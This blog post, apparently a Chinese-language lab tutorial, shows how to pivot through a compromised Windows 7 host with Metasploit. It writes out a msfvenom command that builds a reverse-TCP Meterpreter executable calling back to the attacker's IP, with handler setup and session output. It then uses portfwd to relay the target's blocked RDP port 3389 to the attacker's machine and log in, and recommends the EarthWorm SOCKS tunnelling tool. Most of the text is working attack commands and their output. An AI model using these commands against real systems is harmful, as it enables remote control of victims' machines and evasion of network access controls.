---
layout: post
title: Metasploit 「网络穿透」端口转发
comments: false
description: ""
keywords: "Tricks"
---

Metasploit下Meterpreter中有一个网络命令，可以替代lcx，nc等来解决大部分端口转发问题；

命令：`portfwd`

## 情况？

Mac【Metasploit】：192.168.43.100

Win7【目标机】：192.168.43.103【桥接】，开启3389端口方便检测验证

实际场景：目标机特殊端口禁止外网访问【如3389...】等等；

## portfwd

拿到目标机的 meterpreter shell；

```
[Go0s]: ~ 
➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe > ~/Desktop/shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
```

直接在跳板机运行上线；

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.43.100
lhost => 192.168.43.100
msf exploit(handler) > exploit 

[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] Sending stage (179267 bytes) to 192.168.43.103
[*] Meterpreter session 1 opened (192.168.43.100:4444 -> 192.168.43.103:49236) at 2018-01-09 11:28:21 +0800
```

使用portfwd进行转发，portfwd是Meterpreter shell的一个网络命令，要先进入这个session；

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.

meterpreter > portfwd add -l 3389 -r 192.168.43.103 -p 3389
[*] Local TCP relay created: :3389 <-> 192.168.43.103:3389

meterpreter > portfwd

Active Port Forwards
====================

   Index  Local         Remote               Direction
   -----  -----         ------               ---------
   1      0.0.0.0:3389  192.168.43.103:3389  Forward

1 total active port forwards.
```

命令：`portfwd add -l 3389 -r 192.168.43.103 -p 3389`

意思是将远端3389端口转到本地3389端口并监听；

链接本地127.0.0.1:3389即可登陆到远程服务器；

oth.

```
列出端口转发条目
portfwd list

删除id为1的端口转发
portfwd delete -i 1

清空所有转发
portfwd flush
```

## 验证

本地查看端口和服务；

```
[Go0s]: ~ 
➜  netstat -antp tcp | grep 3389
(standard input):3:tcp4       0      0  *.3389                 *.*                    LISTEN     

➜  sudo nmap -sS -p 3389 127.0.0.1  
Password:

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-11 11:35 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

使用Microsoft Remote Desktop登陆127.0.0.1:3389；

![QQ20180111-114210@2x.png](/assets/images/2018-01-09/1661489601.png)

成功登陆；

![QQ20180111-114004@2x.png](/assets/images/2018-01-09/3599794516.png)

## 弊端？

实际使用Portfwd效果可能会差，因为当数据流过大时候会将Meterpreter直接搞掉；

使用Socks5代理的ew效果会很好，含各种代理各种平台；

ew下载地址： [http://rootkiter.com/EarthWorm](http://rootkiter.com/EarthWorm/)
